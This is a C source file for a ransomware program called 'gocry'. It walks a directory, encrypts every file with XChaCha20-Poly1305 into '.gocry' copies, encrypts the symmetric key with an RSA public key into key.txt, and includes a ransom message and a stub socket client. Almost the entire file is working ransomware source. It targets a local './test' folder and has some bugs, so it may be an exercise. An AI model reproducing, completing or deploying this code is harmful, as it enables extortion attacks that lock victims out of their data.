#include <arpa/inet.h>
#include <dirent.h>
#include <netdb.h>
#include <netinet/in.h>
#include <openssl/evp.h>
#include <openssl/ossl_typ.h>
#include <openssl/pem.h>
#include <openssl/rsa.h>
#include <sodium.h>
#include <sodium/crypto_secretstream_xchacha20poly1305.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>

#define CHUNK_SIZE  4096
#define RSA_KEY_LEN 2048
#define SERVER_PORT 8080

const char *root_dir_path = "./test";
const char *ransom_message = "You've been infected by gocry.\nAll your files are not encrypted\n";
const char *pub_key_path = "./public.pem";
char *UUID;

static int encrypt(const char *encrypt_to, const char *source_file,
                   const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES]) {
    unsigned char buffer_in[CHUNK_SIZE];
    unsigned char buffer_out[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
    crypto_secretstream_xchacha20poly1305_state st;
    FILE *fp_t, *fp_s;
    unsigned long long out_len;
    size_t rlen;
    int eof;
    unsigned char tag;

    fp_s = fopen(source_file, "rb");
    fp_t = fopen(encrypt_to, "wb");
    crypto_secretstream_xchacha20poly1305_init_push(&st, header, key);
    fwrite(header, 1, sizeof header, fp_t);
    do {
        rlen = fread(buffer_in, 1, sizeof buffer_in, fp_s);
        eof = feof(fp_s);
        tag = eof ? crypto_secretstream_xchacha20poly1305_TAG_FINAL : 0;
        crypto_secretstream_xchacha20poly1305_push(&st, buffer_out, &out_len, buffer_in, rlen, NULL, 0, tag);
        fwrite(buffer_out, 1, (size_t)out_len, fp_t);
    } while (!eof);

    fclose(fp_t);
    fclose(fp_s);
    return 0;
}

static int decrypt(const char *to_encrypt, const char *source_file,
                   const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES]) {
    unsigned char buf_in[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    unsigned char buf_out[CHUNK_SIZE];
    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
    crypto_secretstream_xchacha20poly1305_state st;
    FILE *fp_t, *fp_s;
    unsigned long long out_len;
    size_t rlen;
    int eof;
    int ret = -1;
    unsigned char tag;

    fp_s = fopen(source_file, "rb");
    fp_t = fopen(to_encrypt, "wb");
    fread(header, 1, sizeof header, fp_s);
    if (crypto_secretstream_xchacha20poly1305_init_pull(&st, header, key) != 0) {
        goto ret;
    }
    do {
        rlen = fread(buf_in, 1, sizeof buf_in, fp_s);
        eof = feof(fp_s);
        if (crypto_secretstream_xchacha20poly1305_pull(&st, buf_out, &out_len, &tag, buf_in, rlen, NULL, 0) !=
            0) {
            goto ret;
        }
        if (tag == crypto_secretstream_xchacha20poly1305_TAG_FINAL && !eof) {
            goto ret;
        }
        fwrite(buf_out, 1, (size_t)out_len, fp_t);
    } while (!eof);

    ret = 0;
ret:
    fclose(fp_t);
    fclose(fp_s);
    return ret;
}

int handle_socket_connection(int socketfd) {
    char buff[1024];
    int n;
    for (;;) {
        bzero(buff, sizeof(buff));
        printf("Enter the string : ");
        n = 0;
        while ((buff[n++] = getchar()) != '\n')
            ;
        write(socketfd, buff, sizeof(buff));
        bzero(buff, sizeof(buff));
        read(socketfd, buff, sizeof(buff));
        printf("From Server : %s", buff);
        if ((strncmp(buff, "exit", 4)) == 0) {
            break;
        }
    }
    free(buff);

    return 0;
}

int setup_socket_connection() {
    int sock = 0, valread;
    struct sockaddr_in serv_addr;
    char *hello = "Hello from client";
    char buffer[1024] = {0};
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Socket creation error \n");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(SERVER_PORT);

    // Convert IPv4 and IPv6 addresses from text to binary form
    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
        printf("\nInvalid address/ Address not supported \n");
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("\nConnection Failed \n");
        return -1;
    }

    if (handle_socket_connection(sock) != 0)
        return 1;
    return 0;
}

int main(void) {
    // libsodium could not be initialized properly so don't run
    if (sodium_init() < 0)
        exit(EXIT_FAILURE);

    DIR *root_dir = opendir(root_dir_path);
    struct dirent *dir;

    char *to_encrypt[512];
    int i = 0;

    if (root_dir) {
        while ((dir = readdir(root_dir)) != NULL) {
            if (!strcmp(dir->d_name, ".") || !strcmp(dir->d_name, "..")) {
                continue;
            }
            puts(dir->d_name);
            to_encrypt[i] = dir->d_name;
            ++i;
        }
        closedir(root_dir);
    }

    unsigned char encryption_key[crypto_secretstream_xchacha20poly1305_KEYBYTES];
    crypto_secretstream_xchacha20poly1305_keygen(encryption_key);
    for (int j = 0; j < i; ++j) {
        char filename[512] = {0};
        char original[512] = {0};

        strcpy(filename, root_dir_path);
        strcat(filename, "/");
        strcat(filename, to_encrypt[j]);
        strcat(filename, ".gocry");

        strcpy(original, root_dir_path);
        strcat(original, "/");
        strcat(original, to_encrypt[j]);

        if (encrypt(filename, original, encryption_key) != 0)
            printf("Error encrypting file %s", to_encrypt[j]);
    }

    // Encrypt the encryption key using RSA.
    EVP_PKEY *pkey;

    FILE *fp = fopen("public.pem", "r");
    if (fp == NULL)
        exit(EXIT_FAILURE);

    pkey = PEM_read_PUBKEY(fp, NULL, NULL, NULL);
    fclose(fp);

    if (pkey == NULL)
        exit(EXIT_FAILURE);

    RSA *rsa = EVP_PKEY_get1_RSA(pkey);
    if (rsa == NULL)
        exit(EXIT_FAILURE);
    EVP_PKEY_free(pkey);

    char *encrypted_message = malloc(RSA_size(rsa));
    int encrypted_len;

    if ((encrypted_len =
             RSA_public_encrypt(strlen((const char *)encryption_key) + 1, (unsigned char *)encryption_key,
                                (unsigned char *)encrypted_message, rsa, RSA_PKCS1_OAEP_PADDING)) == -1) {
        printf("error encrypting keys");
        return 1;
    }

    FILE *out = fopen("./key.txt", "w");
    fwrite(encrypted_message, sizeof(*encrypted_message), RSA_size(rsa), out);
    fclose(out);
    free(encrypted_message);

    return EXIT_SUCCESS;
}
